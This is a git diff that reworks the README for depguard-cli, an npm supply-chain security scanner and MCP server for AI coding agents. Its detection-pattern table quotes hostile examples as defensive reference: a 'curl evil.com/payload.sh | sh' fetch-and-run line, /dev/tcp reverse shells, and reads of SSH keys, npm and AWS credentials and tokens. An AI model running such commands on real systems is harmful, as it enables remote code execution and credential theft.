@@ -1,242 +1,33 @@
 # depguard-cli
 
-MCP security server for AI coding agents. 14 tools: **workspace auto-exec audit** (pre-open repo scan that defends against fake-interview / take-home-test malware), **static code analysis**, pre-install guardian, AI hallucination guard, dead dependency detection, vulnerability audit, supply chain attack detection, smart recommendations, **remediation planner**, and **CycloneDX 1.6 SBOM generation**.
+**MCP security server for AI coding agents.** 14 tools — workspace auto-exec audit (defends against fake-interview / take-home-test malware), static code analysis, pre-install guardian, AI hallucination guard, dead-dependency detection, vulnerability audit, remediation planner, CycloneDX 1.6 SBOM, and SARIF v2.1.0 output for GitHub Code Scanning. Zero runtime dependencies. Works with Claude, Cursor, Windsurf, and any MCP client.
 
-Your AI agent verifies every `npm install` before it happens. Tarball download and source code scanning detects malware patterns, obfuscation, and behavioral mismatches. Zero runtime dependencies. Works with Claude, Cursor, Windsurf, and any MCP client.
+[![npm](https://img.shields.io/npm/v/depguard-cli)](https://www.npmjs.com/package/depguard-cli) [![license](https://img.shields.io/npm/l/depguard-cli)](LICENSE)
 
-## Why this exists
+## Why depguard
 
-I work on industrial software where every event has to be logged and recoverable. Customers trust the system because the audit trail makes the system trustworthy.
-
-When I started wiring AI coding agents into our internal stack, I realised the npm ecosystem treats supply-chain integrity as someone else's problem — install 1,000 packages, hope for the best. depguard is my attempt to bring the same auditability mindset to the JavaScript dependencies we depend on every day: verify before installing, audit what's already there, generate an SBOM your security team can actually use.
+I work on industrial software where every event has to be logged and recoverable — customers trust the system because the audit trail makes the system trustworthy. When I started wiring AI coding agents into our internal stack, I realised the npm ecosystem treats supply-chain integrity as someone else's problem: install 1,000 packages, hope for the best. depguard brings the same auditability mindset to JavaScript dependencies — verify before installing, audit what's already there, generate an SBOM your security team can actually use.
 
 Zero runtime dependencies — because a security tool that pulls in 200 transitive packages is the joke that writes itself.
 
 ## Install
 
 ```bash
-npm install -g depguard-cli
-```
-
-Or use directly:
-
-```bash
+npm install -g depguard-cli      # or use directly with npx
 npx depguard-cli audit express
 ```
 
-## CLI
+## MCP server (primary use case)
+
+depguard exposes 14 [MCP](https://modelcontextprotocol.io/) tools over stdio. Add it to any MCP-compatible client and your AI agent calls them automatically when it's about to install something, audit a project, or review code.
+
+**Setup — Claude Code one-liner:**
 
 ```bash
-# Full audit report (optionally pin a version)
-depguard-cli audit <package[@version]> [--target-license MIT] [--json|--format sarif]
-
-# Project audit — direct deps, transitive (via lockfile), and packageManager
-depguard-cli audit-project <path/package.json> [--include-dev] [--target-license MIT] [--json|--format sarif]
-
-# Search npm for packages
-depguard-cli search <keywords...> [--limit 10] [--json]
-
-# Score a package 0-100
-depguard-cli score <package> [--target-license MIT] [--json]
-
-# Get install/write recommendation
-depguard-cli should-use <intent...> [--threshold 60] [--json]
-
-# Pre-install guardian (verify + audit + allow/warn/block)
-depguard-cli guard <package> [--threshold 60] [--block] [--json]
-
-# Detect unused dependencies
-depguard-cli sweep [path] [--include-dev] [--json]
-
-# Deep transitive dependency tree audit
-depguard-cli audit-deep <package> [--json]
-
-# AI code review (detect debris left by AI agents)
-depguard-cli review [path] [--full] [--json]
-
-# Generate a CycloneDX 1.6 SBOM (Software Bill of Materials)
-depguard-cli sbom <path/package.json> [--include-vex] [--include-dev] [-o out.json]
-
-# Workspace auto-exec audit — pre-open repo scan
-# Run BETWEEN `git clone` and opening the folder in your IDE. Lists every
-# file that auto-executes when the workspace opens (VS Code tasks runOn:
-# folderOpen, devcontainer lifecycle commands, direnv .envrc, JetBrains
-# run configs, Makefile default targets, .gitattributes filter drivers,
-# committed git hooks). Exit code 2 on HIGH, 1 on WARN — CI-ready.
-depguard-cli audit-workspace [path] [--json|--format sarif]
-
-# Local usage statistics (calls, tokens saved, threats blocked)
-depguard-cli stats [--json]
+claude mcp add --transport stdio depguard -- npx -y depguard-cli --mcp
 ```
 
-### Examples
-
-```bash
-# Audit express for an Apache-2.0 project
-depguard-cli audit express --target-license Apache-2.0
-
-# Audit a specific installed version (not just latest)
-depguard-cli audit express@4.17.1
-
-# Find date formatting libraries
-depguard-cli search date formatting --limit 5
-
-# Score a package
-depguard-cli score lodash --json
-
-# Should I install or write my own?
-depguard-cli should-use "http client" --threshold 70
-
-# Check before installing — blocks nonexistent/typosquat packages
-depguard-cli guard expresss
-# [WARN] expresss
-#   Possible typosquat of: express
-
-# Find unused dependencies in your project
-depguard-cli sweep . --include-dev
-```
-
-### GitHub Code Scanning (SARIF)
-
-`audit`, `audit-project`, and `audit-workspace` can emit SARIF v2.1.0 with `--format sarif`. The output uploads cleanly to the GitHub Security tab — rule IDs are GHSA-stable so alerts dedupe across runs.
-
-```yaml
-# .github/workflows/depguard.yml
-name: depguard
-on: [push, pull_request]
-jobs:
-  audit:
-    runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      security-events: write   # required to upload SARIF
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
-        with: { node-version: 22 }
-      - name: Pre-open workspace audit
-        run: npx -y depguard-cli audit-workspace . --format sarif -o workspace.sarif || true
-      - name: Project dependency audit
-        run: npx -y depguard-cli audit-project ./package.json --format sarif -o project.sarif || true
-      - uses: github/codeql-action/upload-sarif@v3
-        with:
-          sarif_file: |
-            workspace.sarif
-            project.sarif
-```
-
-The `|| true` lets you keep uploading SARIF even when depguard exits non-zero on HIGH findings — the alerts still appear in the Security tab.
-
-## API
-
-```typescript
-import { audit, search, score, scoreFromReport, shouldUse, guard, verify, sweep, auditBulk, auditProject, generateSBOM } from 'depguard-cli'
-
-// Full audit report (now includes static code analysis)
-const report = await audit('express', 'MIT')
-console.log(report.vulnerabilities.total)      // 0
-console.log(report.securityFindings)           // [] (clean) or SecurityFinding[]
-console.log(report.codeAnalysis.filesAnalyzed) // 42
-console.log(report.licenseCompatibility.compatible) // true
-console.log(report.weeklyDownloads)            // 35000000
-
-// Search packages
-const results = await search('date formatting', { limit: 5 })
-results.forEach(r => console.log(`${r.score}/100 ${r.name}`))
-
-// Score 0-100
-const result = await score('lodash', { targetLicense: 'MIT' })
-console.log(result.total)       // 82
-console.log(result.breakdown)   // { security: 100, maintenance: 75, ... }
-
-// Install or write from scratch?
-const rec = await shouldUse('http client')
-console.log(rec.action)     // "install"
-console.log(rec.package)    // "axios"
-console.log(rec.reasoning)  // "axios scores 85/100 (≥60) — safe to install"
-
-// Pre-install guardian — verify + audit + decision
-const check = await guard('expresss')
-console.log(check.exists)           // true (but suspicious)
-console.log(check.possibleTyposquat) // true
-console.log(check.similarTo)        // ["express"]
-console.log(check.decision)         // "warn"
-
-// AI hallucination guard — does this package even exist?
-const exists = await verify('ai-hallucinated-pkg')
-console.log(exists.exists)          // false
-
-// Dead dependency detection
-const sweepResult = await sweep('.', { includeDevDependencies: true })
-console.log(sweepResult.unused)     // [{ name: 'lodash', status: 'unused', ... }]
-console.log(sweepResult.estimatedSavingsKB) // 1400
-```
-
-## Scoring
-
-Each package is scored 0-100 across five dimensions:
-
-| Dimension | Weight | What it measures |
-|-----------|--------|------------------|
-| Security | 30% | Known CVEs, advisories, and static code analysis findings |
-| Maintenance | 25% | Last publish date, version count, deprecation |
-| Popularity | 20% | Weekly downloads (log scale) |
-| License | 15% | Compatibility with your project license |
-| Dependencies | 10% | Dependency count, install scripts |
-
-Weights are configurable via the `weights` option in `score()`.
-
-### Decision thresholds (`shouldUse`)
-
-| Score | Action |
-|-------|--------|
-| >= 60 | `install` — safe to use |
-| 40-59 | `caution` — review before using |
-| < 40 | `write-from-scratch` — better to write your own |
-
-The threshold is configurable via `--threshold` (CLI) or `threshold` option (API).
-
-## Token Savings
-
-Every MCP tool response includes a `tokenSavings` field that shows how many LLM tokens you save compared to manual research (web searches, page fetches, reasoning).
-
-```json
-"tokenSavings": {
-  "responseTokens": 47,
-  "manualEstimate": 11100,
-  "saved": 11053,
-  "percentSaved": 100,
-  "manualSteps": [
-    "WebSearch: \"{package} npm quality maintenance\" (~800 tokens)",
-    "WebFetch: npm registry page (~3000 tokens)",
-    "WebFetch: GitHub repo for activity/stars (~3000 tokens)",
-    "WebSearch: \"{package} vulnerabilities\" (~800 tokens)",
-    "WebFetch: advisories page (~3000 tokens)",
-    "Reasoning: compute weighted score (~500 tokens)"
-  ]
-}
-```
-
-This is automatically included in every response — no configuration needed. It helps teams quantify the cost savings of using depguard in their AI workflows.
-
-## MCP Server
-
-depguard includes a built-in [MCP](https://modelcontextprotocol.io/) (Model Context Protocol) server for AI agent integration. It works with **any MCP-compatible client**.
-
-### Compatible AI clients
-
-| Client | Configuration |
-|--------|--------------|
-| Claude Code | `.mcp.json` or `~/.claude/settings.json` |
-| Claude Desktop | `claude_desktop_config.json` |
-| Cursor | MCP settings in IDE |
-| Windsurf | MCP settings in IDE |
-| Continue.dev | `config.json` MCP section |
-| Cline / Roo Code | MCP settings |
-
-### Setup
-
-Using npx (no install needed):
+**Setup — generic MCP config** (Claude Desktop, Cursor, Windsurf, Continue.dev, Cline, Roo Code):
 
 ```json
 {
@@ -249,354 +40,231 @@ Using npx (no install needed):
 }
 ```
 
-Or if installed globally:
+### The 14 tools
+
+| Tool | Use it when |
+|------|-------------|
+| `depguard_guard` | About to install package Y → pre-install verify + audit + allow/warn/block |
+| `depguard_should_use` | Need functionality X → recommend install / use-native / write-from-scratch |
+| `depguard_audit_workspace` | **Just cloned a repo, before opening it in any IDE.** Lists files that auto-execute on workspace open (VS Code tasks `runOn:folderOpen`, devcontainer lifecycle, `.envrc`, JetBrains run configs, Makefile, `.gitattributes`, committed git hooks). Defends against fake-interview / take-home-test malware. |
+| `depguard_audit_project` | Audit a whole project — direct deps, transitives via lockfile, `packageManager` field |
+| `depguard_remediate` | "100 vulnerabilities, which 5 direct deps do I bump?" — groups transitives by parent, sorted by severity weight |
+| `depguard_audit` | Deep dive on one package (vulnerabilities + static code analysis + install scripts) |
+| `depguard_audit_bulk` | Compare A vs B vs C in one call |
+| `depguard_audit_deep` | Full transitive tree audit for one package |
+| `depguard_review` | AI code review — detect debris left by AI agents (console.logs, empty catch, broken imports, orphan files) |
+| `depguard_sweep` | Find unused dependencies in a project |
+| `depguard_search` | Search npm by keywords, ranked by depguard score |
+| `depguard_score` | Score 0-100 for one package |
+| `depguard_verify` | AI hallucination guard — does this package exist? Is it a typosquat? |
+| `depguard_sbom` | Generate a CycloneDX 1.6 SBOM (EU CRA, US EO 14028, SOC 2, FedRAMP) |
+
+Every MCP response includes a `tokenSavings` field that quantifies the LLM-tokens saved vs equivalent manual research:
 
 ```json
-{
-  "mcpServers": {
-    "depguard": {
-      "command": "depguard-cli",
-      "args": ["--mcp"]
-    }
-  }
+"tokenSavings": {
+  "responseTokens": 47,
+  "manualEstimate": 11100,
+  "saved": 11053,
+  "percentSaved": 100,
+  "manualSteps": [
+    "WebSearch: '{package} npm quality maintenance' (~800 tokens)",
+    "WebFetch: npm registry page (~3000 tokens)",
+    "WebFetch: GitHub repo for activity/stars (~3000 tokens)",
+    "WebSearch: '{package} vulnerabilities' (~800 tokens)",
+    "WebFetch: advisories page (~3000 tokens)",
+    "Reasoning: compute weighted score (~500 tokens)"
+  ]
 }
 ```
 
-Or via Claude Code CLI:
+Automatic, no configuration. Lets teams quantify the LLM cost reduction of routing dependency questions through depguard instead of free-text web research.
+
+## CLI
 
 ```bash
-claude mcp add --transport stdio depguard -- npx -y depguard-cli --mcp
+depguard-cli audit <package[@version]> [--target-license MIT] [--json|--format sarif]
+depguard-cli audit-project <path/package.json> [--include-dev] [--json|--format sarif]
+depguard-cli audit-workspace [path] [--json|--format sarif]
+depguard-cli audit-deep <package> [--json]
+depguard-cli guard <package> [--threshold 60] [--block] [--json]
+depguard-cli should-use <intent...> [--threshold 60] [--json]
+depguard-cli sweep [path] [--include-dev] [--json]
+depguard-cli review [path] [--full] [--json]
+depguard-cli sbom <path/package.json> [--include-vex] [--include-dev] [-o out.json]
+depguard-cli remediate <path/package.json> [--json]
+depguard-cli search <keywords...> [--limit 10] [--json]
+depguard-cli score <package> [--target-license MIT] [--json]
+depguard-cli stats [--json]
 ```
 
-### Available tools
+Pre-install guardian in action:
 
-| Tool | Description |
-|------|-------------|
-| `depguard_audit` | Full security audit with static code analysis, vulnerabilities, and install script scanning. Accepts optional `version` to audit a specific installed version. |
-| `depguard_audit_bulk` | Audit multiple packages in a single call |
-| `depguard_audit_project` | Audit all dependencies from a package.json file path. Scans transitive deps via lock file and audits the `packageManager` field. |
-| `depguard_audit_workspace` | Pre-open audit of a freshly cloned repo. Lists files that auto-execute when the workspace opens (`.vscode/tasks.json` `runOn:folderOpen`, `.vscode/settings.json` shell overrides, `.devcontainer` lifecycle commands, `.envrc`, JetBrains run configurations, Makefile default targets, `.gitattributes` filter drivers, committed git hooks). FP-averse INFO/WARN/HIGH classification. Defends against fake-interview / take-home-test malware. |
-| `depguard_remediate` | Group every vulnerable transitive under the direct dependency that pulls it in, sorted by severity weight. Answers "which 5 direct deps do I bump to fix the most criticals?". Read-only. |
-| `depguard_search` | Search npm for packages by keywords |
-| `depguard_score` | Score a package 0-100 |
-| `depguard_should_use` | Recommend install, use native Node.js, or write from scratch |
-| `depguard_guard` | Pre-install guardian: verify, audit, allow/warn/block decision |
-| `depguard_verify` | AI hallucination guard: check if a package exists + typosquatting |
-| `depguard_sweep` | Dead dependency detection: find unused packages in a project |
-| `depguard_audit_deep` | Deep transitive dependency tree audit with vulnerability aggregation |
-| `depguard_review` | AI Code Review: detect debris left by AI agents (console.logs, empty catch, broken imports, orphan files) |
-| `depguard_sbom` | Generate a CycloneDX 1.6 SBOM (with optional VEX vulnerability data) for compliance, supply-chain, and EU CRA / US EO 14028 use cases |
+```bash
+$ depguard-cli guard expresss
+[WARN] expresss
+  Possible typosquat of: express
+  Score: 45/100 is below threshold 60
 
-**Which tool should I use?**
+$ depguard-cli guard ai-made-up-package
+[BLOCK] ai-made-up-package
+  Package does NOT exist on npm!
+```
 
-| Situation | Tool |
-|-----------|------|
-| "I need X functionality" | `depguard_should_use` |
-| "Install package Y" | `depguard_guard` |
-| "I just cloned a repo, is it safe to open?" | `depguard_audit_workspace` |
-| "Audit my project" | `depguard_audit_project` |
-| "100 vulnerabilities, what do I bump?" | `depguard_remediate` |
-| "Compare A vs B vs C" | `depguard_audit_bulk` |
-| "Deep dive on package Y" | `depguard_audit` |
-| "Find a library for X" | `depguard_search` |
-| "Clean up unused deps" | `depguard_sweep` |
-| "Review my code" | `depguard_review` |
-| "Generate an SBOM" / "I need a CycloneDX file" | `depguard_sbom` |
+### GitHub Code Scanning (SARIF v2.1.0)
 
-### Bulk audit
+`audit`, `audit-project`, and `audit-workspace` accept `--format sarif` and emit SARIF v2.1.0 with GHSA-stable rule IDs (`depguard/vuln/GHSA-…`), CVSS-propagated severity, and stable `partialFingerprints` for dedup across runs.
 
-Audit all project dependencies in a single call. Accepts a list of package names or a dependencies object directly from `package.json`:
+```yaml
+# .github/workflows/depguard.yml
+- name: Pre-open workspace audit
+  run: npx -y depguard-cli audit-workspace . --format sarif -o workspace.sarif || true
+- name: Project dependency audit
+  run: npx -y depguard-cli audit-project ./package.json --format sarif -o project.sarif || true
+- uses: github/codeql-action/upload-sarif@v3
+  with:
+    sarif_file: |
+      workspace.sarif
+      project.sarif
+```
+
+## API
 
 ```typescript
-// Via API
-import { auditBulk } from 'depguard-cli'
+import { audit, auditProject, sweep, guard, generateSBOM, auditToSarif } from 'depguard-cli'
 
-const report = await auditBulk(['react', 'express', 'lodash'], { targetLicense: 'MIT' })
-console.log(report.total)       // 3
-console.log(report.vulnerable)  // 2
-console.log(report.summary)     // { critical: 0, high: 2, moderate: 5, low: 3 }
+const report = await audit('express', 'MIT')
+report.vulnerabilities.total     // 0
+report.securityFindings          // SecurityFinding[] (static code analysis)
+report.licenseCompatibility.compatible // true
+
+const project = await auditProject('./package.json', { includeDevDependencies: true })
+project.summary               // { critical: 0, high: 2, moderate: 5, low: 3 }
+project.transitiveSummary     // { totalDeps: 800, vulnerable: 12, ... }
+project.packageManagerAudit   // audit of `packageManager: yarn@4.5.3`
+
+const sweepResult = await sweep('.', { includeDevDependencies: true })
+sweepResult.unused              // [{ name: 'lodash', estimatedSizeKB: 1400, ... }]
+sweepResult.estimatedSavingsKB  // 2450
+
+const decision = await guard('expresss')
+decision.possibleTyposquat  // true
+decision.similarTo          // ["express"]
+decision.decision           // "warn"
+
+const bom = await generateSBOM('./package.json', { includeVex: true })
+bom.specVersion             // "1.6"
+bom.vulnerabilities         // [{ id: "GHSA-...", ratings: [...], affects: [...] }]
 ```
 
-Via MCP, the AI agent can pass the dependencies object from `package.json` directly — no need to extract package names manually.
+## What depguard checks
 
-### Project audit
+### Scoring
 
-Audit all dependencies from a `package.json` file in one call. When a lock file is present (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, or `bun.lock`), depguard also scans all transitive dependencies for known vulnerabilities and audits the `packageManager` field:
+Each package is scored 0-100 across five dimensions, with thresholds tuned for AI-agent decision-making:
 
-```typescript
-import { auditProject } from 'depguard-cli'
+| Dimension | Weight | What it measures |
+|-----------|--------|------------------|
+| Security | 30% | CVEs, advisories, static code analysis findings |
+| Maintenance | 25% | Last publish, version count, deprecation |
+| Popularity | 20% | Weekly downloads (log scale) |
+| License | 15% | Compatibility with your project's target license |
+| Dependencies | 10% | Dependency count, install scripts |
 
-const report = await auditProject('./package.json', {
-  includeDevDependencies: true,  // also audit devDependencies
-})
+Decisions (`shouldUse`): `>= 60` → install, `40-59` → caution, `< 40` → write from scratch.
 
-// Direct dependency audit results
-console.log(report.summary)            // { critical: 0, high: 2, moderate: 5, low: 3 }
+**Static-analysis caps the security score regardless of popularity** — this is deliberate: a wildly popular package with a credential-stealing payload still loses.
 
-// Transitive dependency vulnerabilities (from lock file)
-console.log(report.transitiveSummary)  // { totalDeps: 800, vulnerable: 12, critical: 1, ... }
+| Worst finding | Security score capped at |
+|---------------|---------------------------|
+| Critical (e.g. malware, reverse shell) | **20/100** |
+| High (e.g. obfuscation, env-var exfil) | **45/100** |
+| None | unrestricted |
 
-// Package manager audit (e.g. yarn@4.5.3)
-console.log(report.packageManagerAudit?.vulnerabilities)
-```
+### Pre-install guardian
 
-Via MCP, the agent just passes the file path — depguard reads it, detects the project license, scans the lock file for transitive deps, and audits everything.
+Three sequential checks before `npm install`: (1) does the package exist on npm? (2) is the name a typosquat — Levenshtein distance against 100+ top packages? (3) full security audit. Used as the recommended MCP entry point for AI agents.
 
-### SBOM generation (CycloneDX 1.6)
+### Install script analysis
 
-Generate a Software Bill of Materials in CycloneDX 1.6 format for compliance with the **EU Cyber Resilience Act**, **US Executive Order 14028 / OMB M-22-18**, SOC 2, FedRAMP, and any enterprise procurement process that requires SBOMs from suppliers. The output is consumed unchanged by downstream tools like Dependency-Track, Trivy, Grype, and OWASP DT.
-
-```bash
-# Write SBOM to disk (109 components for the depguard repo itself)
-depguard-cli sbom ./package.json -o sbom.cdx.json
-
-# Include VEX vulnerability data (CVEs/GHSAs inline, with CVSS + patched versions)
-depguard-cli sbom ./package.json --include-vex --include-dev -o sbom.cdx.json
-```
-
-```typescript
-import { generateSBOM } from 'depguard-cli'
-
-const bom = await generateSBOM('./package.json', {
-  includeVex: true,
-  includeDevDependencies: true,
-})
-console.log(bom.specVersion)         // '1.6'
-console.log(bom.components?.length)  // 109
-console.log(bom.vulnerabilities)     // [{ id: 'GHSA-...', ratings: [...], affects: [...] }, ...]
-```
-
-The CycloneDX serialization is implemented natively in TypeScript against the public CycloneDX 1.6 JSON Schema — depguard does **not** depend on `@cyclonedx/cyclonedx-library` or any other runtime package, preserving the zero-runtime-dependencies guarantee. Output validity is verified against the official CycloneDX validator.
-
-PURLs follow the [Package URL spec](https://github.com/package-url/purl-spec/blob/main/PURL-TYPES.rst#npm) (`pkg:npm/lodash@4.17.21`, `pkg:npm/%40types/node@20.0.0`). Integrity hashes (SHA-512) are extracted from `package-lock.json` and converted from base64 to hex per the CycloneDX schema.
-
-## Pre-Install Guardian
-
-The `guard` command is the recommended entry point for AI agents. Before installing any package, it runs three checks in sequence:
-
-1. **Existence check** — Does the package exist on npm? (blocks AI hallucinations)
-2. **Typosquatting detection** — Is the name suspiciously similar to a popular package? (Levenshtein distance against 100+ top packages)
-3. **Security audit** — Score, vulnerabilities, deprecated status, install script analysis
-
-```bash
-# Safe package
-depguard-cli guard express
-# [ALLOW] express
-#   Score: 82/100 — safe to install
-
-# Typosquat attempt
-depguard-cli guard expresss
-# [WARN] expresss
-#   Possible typosquat of: express
-#   Score: 45/100 is below threshold 60
-
-# Nonexistent package (AI hallucination)
-depguard-cli guard ai-made-up-package
-# [BLOCK] ai-made-up-package
-#   Package does NOT exist on npm!
-```
-
-Use `--block` to escalate all warnings to blocks (useful in CI):
-
-```bash
-depguard-cli guard sketchy-lib --block
-```
-
-### AI Hallucination Guard
-
-The `verify` tool is a lightweight version of `guard` — it only checks if a package exists and whether the name is a possible typosquat. No audit, no scoring. Fast enough to run on every `npm install` suggestion from an AI agent.
-
-```typescript
-import { verify } from 'depguard-cli'
-
-const result = await verify('expresss')
-console.log(result.exists)           // true
-console.log(result.possibleTyposquat) // true
-console.log(result.similarTo)        // ["express"]
-```
-
-## Dead Dependency Detection
-
-The `sweep` command scans your project to find npm packages listed in `package.json` but not actually imported or used in source code.
-
-```bash
-depguard-cli sweep . --include-dev
-
-# Scanned 42 files, 15 dependencies
-#
-# Unused (3):
-#   - lodash@^4.17.21 (~1400 KB)
-#   - moment@^2.29.4 (~800 KB)
-#   - request@^2.88.2 (~250 KB)
-#
-# Maybe unused (1):
-#   ? some-dev-tool@^1.0.0
-#
-# Estimated savings: ~2450 KB
-```
-
-**Smart detection:**
-- Scans all `.js`, `.ts`, `.mjs`, `.cjs`, `.jsx`, `.tsx` files for `import`/`require`/`export from`
-- Recognizes config-only dependencies (eslint, prettier, typescript, jest, vitest, babel, tailwind, etc.)
-- Detects binaries used in npm scripts
-- Handles `@types/*` packages paired with runtime dependencies
-- Marks untraced devDependencies as "maybe-unused" instead of "unused"
-- Estimates disk size savings
-
-```typescript
-import { sweep } from 'depguard-cli'
-
-const result = await sweep('.', { includeDevDependencies: true })
-console.log(result.unused)            // [{ name: 'lodash', estimatedSizeKB: 1400, ... }]
-console.log(result.estimatedSavingsKB) // 2450
-```
-
-## Smart Advisor
-
-The `should_use` tool now checks for native Node.js alternatives before recommending npm packages:
-
-```
-"I need an http client"     → Use native fetch() (Node 18+). No package needed.
-"I need uuid generation"    → Use crypto.randomUUID() (Node 19+). No package needed.
-"I need deep cloning"       → Use structuredClone() (Node 17+). No package needed.
-"I need a date formatter"   → Install date-fns (score 85). No native alternative.
-```
-
-Covers 20+ common intents including fetch, uuid, hashing, URL parsing, CLI args, testing, SQLite, glob, streams, compression, and more. Each recommendation includes example code and the minimum Node.js version required.
-
-## Fix Suggestions
-
-When vulnerabilities are found, each audit report includes actionable fix suggestions:
-
-```json
-"fixSuggestions": [
-  {
-    "vulnerability": "Prototype Pollution",
-    "severity": "high",
-    "currentVersion": "4.17.19",
-    "fixVersion": "4.17.21",
-    "action": "upgrade"
-  }
-]
-```
-
-If no patch exists, `action` is `"no-fix-available"`.
-
-## GitHub Token
-
-For higher GitHub Advisory API rate limits (60/hour → 5,000/hour), set a GitHub token:
-
-```bash
-export GITHUB_TOKEN=ghp_your_token_here
-```
-
-No special scopes needed — the token only identifies you for rate limiting. If already set (e.g. by `gh` CLI or GitHub Actions), depguard uses it automatically.
-
-## Install Script Analysis
-
-depguard statically analyzes install scripts (`preinstall`, `install`, `postinstall`) for suspicious patterns commonly used in supply chain attacks:
+depguard statically pattern-matches `preinstall` / `install` / `postinstall` scripts. **Nothing is executed.**
 
 | Pattern | Severity | Example |
 |---------|----------|---------|
 | Remote code execution | Critical | `curl evil.com/payload.sh \| sh` |
 | Reverse shells | Critical | `/dev/tcp/` connections |
-| Credential file access | Critical | Reading `~/.ssh/id_rsa`, `~/.npmrc`, `~/.aws` |
-| Sensitive env vars | Critical | Accessing `$NPM_TOKEN`, `$AWS_SECRET` |
+| Credential file access | Critical | `~/.ssh/id_rsa`, `~/.npmrc`, `~/.aws` |
+| Sensitive env vars | Critical | `$NPM_TOKEN`, `$AWS_SECRET` |
 | Shell typosquatting | Critical | `/bin/ssh` instead of `/bin/sh` |
 | Obfuscated code | High | `eval(Buffer.from(..., "base64"))` |
 | Process spawning | High | `child_process`, `exec()`, `spawn()` |
-| Environment access | High | `process.env` usage |
-| External network calls | Moderate | HTTP requests to non-standard hosts |
 
-Each audit report includes a `scriptAnalysis` field with `suspicious` (boolean) and `risks` (array of detected patterns with severity and description). No scripts are executed — analysis is purely static pattern matching.
+### Static code analysis (tarball scan)
 
-## Static Code Analysis
-
-**New in v1.6.0.** depguard downloads the package tarball from npm, extracts JS files, and scans for 18+ malware patterns across 6 threat categories:
+depguard downloads the package tarball, extracts JS files, and scans for 18+ malware patterns across 6 categories:
 
 | Category | Severity | What it detects |
 |----------|----------|-----------------|
-| `malware` | Critical | Eval of decoded payloads, reverse shells (net.connect), crypto mining (stratum+tcp) |
-| `data-exfiltration` | Critical/High | JSON.stringify(process.env), Object.keys(process.env), dynamic fetch URLs, credential file reads |
-| `code-execution` | High | eval(), new Function(), child_process.exec/spawn, shell spawning |
-| `obfuscation` | High/Medium | Long hex/unicode strings, base64 payloads, minified source in non-.min.js files |
-| `unexpected-behavior` | High/Medium | Network calls in a "formatter" package, filesystem access in a "date utility" |
+| `malware` | Critical | Eval of decoded payloads, reverse shells, crypto-mining |
+| `data-exfiltration` | Critical/High | `JSON.stringify(process.env)`, credential file reads, dynamic fetch URLs |
+| `code-execution` | High | `eval()`, `new Function()`, `child_process.exec/spawn` |
+| `obfuscation` | High/Medium | Long hex/unicode strings, base64 payloads, minified source in non-`.min.js` files |
+| `unexpected-behavior` | High/Medium | Network calls in a "formatter" package, FS access in a "date utility" |
 | `supply-chain` | Critical | Typosquatting patterns in install scripts |
 
-Every finding includes a rich `SecurityFinding` object:
+**Behavioral mismatch** compares the package's stated purpose (description + keywords) against detected runtime behavior. A "string formatter" that makes network calls is flagged with a rich `SecurityFinding` (title, explanation, evidence, file, recommendation).
 
-```typescript
-interface SecurityFinding {
-  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
-  category: 'malware' | 'supply-chain' | 'vulnerability' | 'obfuscation' | 'data-exfiltration' | 'unexpected-behavior' | 'code-execution'
-  title: string           // "Serialization of entire environment"
-  explanation: string     // Rich, human-readable explanation of WHY it's dangerous
-  evidence: string        // The exact code that triggered the detection
-  file: string            // Where it was found (e.g. "src/index.js")
-  recommendation: string  // What to do about it
-}
-```
+### Dead-dependency detection
 
-### Behavioral Mismatch Detection
+`sweep` scans `.js/.ts/.mjs/.cjs/.jsx/.tsx` for `import` / `require` / `export from`, recognises config-only dependencies (eslint, prettier, jest, tailwind, …), detects binaries used in npm scripts, pairs `@types/*` with their runtime peer, and marks untraced devDependencies as "maybe-unused" instead of "unused". Reports estimated disk savings.
 
-depguard compares the package description and keywords against detected code behavior. A "string formatter" that makes network calls or a "date utility" that reads the filesystem is flagged as `unexpected-behavior` with a detailed explanation.
+### Native-alternative advisor
 
-### Impact on Scoring
+`should_use` checks for native Node.js APIs before recommending packages — `fetch` (18+), `crypto.randomUUID()` (19+), `structuredClone()` (17+), and 20+ more. Each comes with example code and the minimum Node version.
 
-Critical code analysis findings cap the security score at 20/100. High findings cap at 45/100. This ensures that packages with suspicious source code cannot achieve high scores regardless of popularity or maintenance status.
+### Fix suggestions
 
-## Data sources
+Every vulnerable result includes a `fixSuggestions` array with `currentVersion`, `fixVersion`, and `action: 'upgrade' | 'no-fix-available'`. `depguard_remediate` aggregates these and groups vulnerable transitives by the direct dep that pulls them in, sorted by severity weight.
 
-depguard combines two advisory databases for maximum coverage:
+### License compatibility
 
-| Source | What it catches |
-|--------|----------------|
-| **npm Registry** | Advisories from `npm audit` |
-| **GitHub Advisory Database** | GHSA advisories, often not in npm |
+Permissive-to-copyleft hierarchy: Public Domain → Permissive (MIT, ISC, BSD, Apache-2.0) → Weak Copyleft (LGPL, MPL) → Strong Copyleft (GPL) → Network (AGPL). A dependency is compatible if its license is equally or more permissive than the target license.
 
-Results are deduplicated, filtered by the current package version (only vulnerabilities that actually affect the installed version are reported), and each advisory includes a `source` field (`npm` or `github`).
+## SBOM (CycloneDX 1.6)
 
-### Caching
-
-Results are cached in memory (5 min) and on disk at `~/.depguard/cache/` (24h). This means:
-- Repeated audits of the same package are instant (no network requests)
-- Cache survives process restarts
-- Expired entries are cleaned up automatically on startup
-
-## License compatibility
-
-depguard checks license compatibility using a permissive-to-copyleft hierarchy:
-
-```
-Public Domain (Unlicense, CC0) → Permissive (MIT, ISC, BSD, Apache-2.0)
-  → Weak Copyleft (LGPL, MPL) → Strong Copyleft (GPL) → Network (AGPL)
-```
-
-A dependency is compatible if its license is equally or more permissive than your project's target license.
-
-## Design principles
-
-- **Zero runtime dependencies** — only Node.js built-in APIs (`fetch`, `crypto`, `readline`)
-- **Never throws on network errors** — returns degraded results with warnings
-- **TypeScript strict mode** — full type safety
-- **100% offline tests** — all tests use mock fetch
-- **Cache-friendly** — 5-minute in-memory TTL to avoid rate limits
-
-## Development
+Native CycloneDX 1.6 generation against the public JSON Schema — no `@cyclonedx/cyclonedx-library` runtime dependency. Output is consumed unchanged by Dependency-Track, Trivy, Grype, and OWASP DT.
 
 ```bash
-npm run build    # compile TypeScript
-npm run lint     # ESLint (strict)
-npm test         # 270 tests (all offline)
-npm run check    # build + lint + test + audit
+depguard-cli sbom ./package.json -o sbom.cdx.json
+depguard-cli sbom ./package.json --include-vex --include-dev -o sbom.cdx.json
 ```
 
-## About the author
